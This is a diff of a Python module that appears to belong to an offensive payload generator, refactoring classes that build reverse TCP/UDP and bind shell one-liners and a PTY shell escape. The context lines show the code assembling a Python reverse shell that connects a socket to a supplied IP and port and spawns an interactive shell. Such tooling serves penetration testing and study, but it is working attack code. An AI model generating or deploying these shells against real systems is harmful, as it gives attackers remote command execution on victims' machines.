@@ -33,10 +33,11 @@ class ReverseTCP(plugin.ReverseShell):
         self.set_write_file()
         self.opts.description = "[ReverseShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
+        self.shell_type = "tcp"
 
     def make_shell(self):
         self.shell = f"""{self.args.type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"""
-        if self.is_udp:
+        if self.shell_type == "udp":
             self.shell += f"""socket.SOCK_DGRAM);s.connect(("{self.args.ip}",{self.args.port}));"""
         else:
             self.shell += f"""socket.SOCK_STREAM);s.connect(("{self.args.ip}",{self.args.port}));"""
@@ -47,7 +48,7 @@ class ReverseTCP(plugin.ReverseShell):
             self.shell += f"""p=subprocess.call(["{self.args.shell}","-i"]);'"""
 
 
-class TTY(plugin.Module):
+class PTY(plugin.Module):
     def __init__(self):
         super().__init__()
         self.add_args(
@@ -66,8 +67,9 @@ class TTY(plugin.Module):
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
         )
-        self.opts.description = "[TTYShell] Python TTY shell escape from https://netsec.ws/?p=337"
+        self.opts.description = "[PTYShell] Python PTY shell escape from https://netsec.ws/?p=337"
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
+        self.shell_type = "pty"
 
     def make_shell(self):
         self.shell = f"""{self.args.type} -c 'import pty; pty.spawn("{self.args.shell}")'"""
@@ -76,7 +78,7 @@ class TTY(plugin.Module):
 class ReverseUDP(ReverseTCP):
     def __init__(self):
         super().__init__()
-        self.is_udp = True
+        self.shell_type = "udp"
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
 
 
@@ -112,6 +114,7 @@ class BindTCP(plugin.BindShell):
         self.opts.description = "\n[BindShell][TCP] Python from infodox/python-pty-shells. License WTFPL."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
         self.set_write_file()
+        self.shell_type = "tcp"
 
     def make_shell(self):
         if self.args.exec == "pty":
@@ -136,7 +139,7 @@ class BindTCP(plugin.BindShell):
 class BindUDP(BindTCP):
     def __init__(self):
         super().__init__()
-        self.is_udp = True
+        self.shell_type = "udp"
         self.opts.description = "[BindShell][UDP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
 
     def make_shell(self):
